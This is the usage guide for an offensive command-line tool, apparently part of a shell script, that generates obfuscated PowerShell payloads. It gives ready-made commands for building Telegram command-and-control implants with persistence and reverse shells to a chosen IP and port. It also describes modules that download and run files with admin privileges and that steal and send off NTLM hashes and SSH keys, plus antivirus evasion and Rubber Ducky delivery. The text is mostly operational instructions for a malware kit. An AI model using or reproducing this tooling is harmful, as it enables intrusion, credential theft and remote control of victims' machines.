Unified CLI tool for generating obfuscated PowerShell payloads for red team operations with module support.

## New Features in V1.1
- **Cloud Module**: Download and execute files from cloud services
- **Dumper Module**: Extract credentials and SSH keys
- Module-based architecture for extensibility

## Installation
1. Make the script executable:
   \`\`\`bash
   chmod +x pmtgener
   \`\`\`

2. Ensure all dependencies are in place:
   \`\`\`bash
   prometheus_loader/
   ├── pmtgener
   ├── chimera.sh
   ├── generators/
   ├── main_loader.txt
   └── stealth_loader.txt
   \`\`\`

## Usage Examples

### Telegram C2 with All Modules
\`\`\`bash
./pmtgener -t better_tg --token "123456:ABC-DEF1234" --id 987654321 --cloud-module --dumper-module
\`\`\`

### Standard Reverse Shell
\`\`\`bash
./pmtgener -t standart --ip 192.168.1.100 --port 4444 -EL 4
\`\`\`

### Basic Telegram Shell with Cloud Module Only
\`\`\`bash
./pmtgener -t tg_shell --token "123456:ABC-DEF1234" --id 987654321 --cloud-module --output malicious.ps1
\`\`\`

## Module Commands

### Cloud Module
Available when using \`--cloud-module\` flag:
- \`/cloud help\` - Show cloud module help
- \`/cloud [url]\` - Download file from URL
- \`/cloud [url] --exec\` - Download and execute
- \`/cloud [url] --exec-admin-priv\` - Execute with admin privileges
- \`/cloud [url] --check-sha256-hash\` - Verify file hash
- \`/cloud [url] /path/to/save\` - Save to specific location

Supported services: Google Drive, Dropbox, GitHub, Yandex Disk, Filebin

### Dumper Module
Available when using \`--dumper-module\` flag:
- \`/dump help\` - Show dumper module help
- \`/dump NTML-hash\` - Extract and send NTML hashes
- \`/dump ssh-keys\` - Extract and send SSH keys

## Features
- Unified interface for all payload types
- Module-based extensibility
- Automatic IP detection
- Chimera obfuscation integration
- Multiple encryption levels (0-5)
- Clean temporary file management

## Payload Types
1. **better_tg** - Advanced Telegram C2 with persistence and module support
2. **standart** - Classic PowerShell reverse shell
3. **advanced** - Reverse shell with stealth and persistence features
4. **tg_shell** - Basic Telegram command execution with module support

## Delivery Methods
Use the provided Ducky Scripts:
- \`stealth_loader.txt\` - For stealthy execution
- \`main_loader.txt\` - For fast execution

Replace "ENTERURLHERE" in loader scripts with your payload URL.

## Notes
- Cloud and Dumper modules only work with Telegram payloads
- Always test payloads in controlled environments
- Use appropriate encryption levels based on target AV
- Telegram tokens should be kept secure
EOF
}

# Run main function
main "$@"
